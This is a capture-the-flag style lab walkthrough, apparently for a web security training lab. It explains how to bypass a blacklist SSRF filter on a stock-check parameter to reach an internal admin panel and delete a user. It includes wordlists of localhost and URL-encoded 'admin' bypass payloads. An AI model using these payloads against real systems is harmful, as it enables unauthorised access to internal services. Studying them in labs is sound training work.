# Lab: SSRF with blacklist-based input filter

 This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.

The developer has deployed two weak anti-SSRF defenses that you will need to bypass. 

# Step 1 Walk the application

I want to see if I can find a potential SSRF vulnerability, and it seems like the /product/stock StockApi parameter is a good potential target:

![image](https://user-images.githubusercontent.com/83407557/210094418-d1849908-43ed-4b2f-9768-948df4ea58b3.png)


# Step 2 Create an intruder attack

I send the request to intruder and set the URL as the payload position:

![image](https://user-images.githubusercontent.com/83407557/210094523-c6f21254-7a58-4dcc-a632-8489078faeaa.png)

Since I want to target several variations of http://localhost/admin I create a wordlist to try and just hit localhost:

```bash
└─$ cat target_urls                
http://localhost/
http://127.0.0.1/
http://127.1./
http://127.1/
http://2130706433/
http://017700000001/
http://LoCaLhOsT/
http://LOCALHOST/
```

I add these as the payloads:

![image](https://user-images.githubusercontent.com/83407557/210095863-6136ac4b-fb85-47c1-97e5-698b2b2b5fe1.png)

I find that 3 of these make it through and give 200 responses

![image](https://user-images.githubusercontent.com/83407557/210095971-372a3655-bdd8-4265-9e65-2755ec07d7d8.png)

# Step 3 Try and get to /admin directory from localhost

I make a new wordlist with variations of admin, with capitalization, single/double URL-encoding, and partial URL encoding

```bash
http://127.1/admin
http://LoCaLhOsT/admin
http://LOCALHOST/admin
http://127.1/AdMiN
http://LoCaLhOsT/AdMiN
http://LOCALHOST/AdMiN
http://127.1/ADMIN
http://LoCaLhOsT/ADMIN
http://LOCALHOST/ADMIN
http://127.1/%61%64%6d%69%6e
http://LoCaLhOsT/%61%64%6d%69%6e
http://LOCALHOST/%61%64%6d%69%6e
http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65
http://LoCaLhOsT/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65
http://LOCALHOST/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65
http://127.1/%61dmin
http://LoCaLhOsT/%61dmin
http://LOCALHOST/%61dmin
http://127.1/%25%36%31dmin
http://LoCaLhOsT/%25%36%31dmin
http://LOCALHOST/%25%36%31dmin
```

With these new payloads, I find that many bypass the filter and get me to the admin panel:

![image](https://user-images.githubusercontent.com/83407557/210097793-87d19872-cf1f-49a1-bc75-3cff94e4d1c6.png)


# Step 4 Use admin panel

I open one of the 200 responses in my browser 

![image](https://user-images.githubusercontent.com/83407557/210097886-3d56286a-333c-4ecf-b28b-140f8b71ef1d.png)

However trying to delete directly from this page fails

![image](https://user-images.githubusercontent.com/83407557/210097929-0cbd68b8-005a-468c-a279-04f90b0dd518.png)

![image](https://user-images.githubusercontent.com/83407557/210097965-211def4e-37dd-4b59-b11f-9f955cc90d70.png)


So I once again need to use SSRF to delete the user from the Stock page using my bypass:

![image](https://user-images.githubusercontent.com/83407557/210098135-d3fa1649-9ecb-4f25-ae35-e3fe427774da.png)

This deletes the user and solves the lab

![image](https://user-images.githubusercontent.com/83407557/210098174-641e6b78-5a8a-488c-8185-50b77d08931c.png)

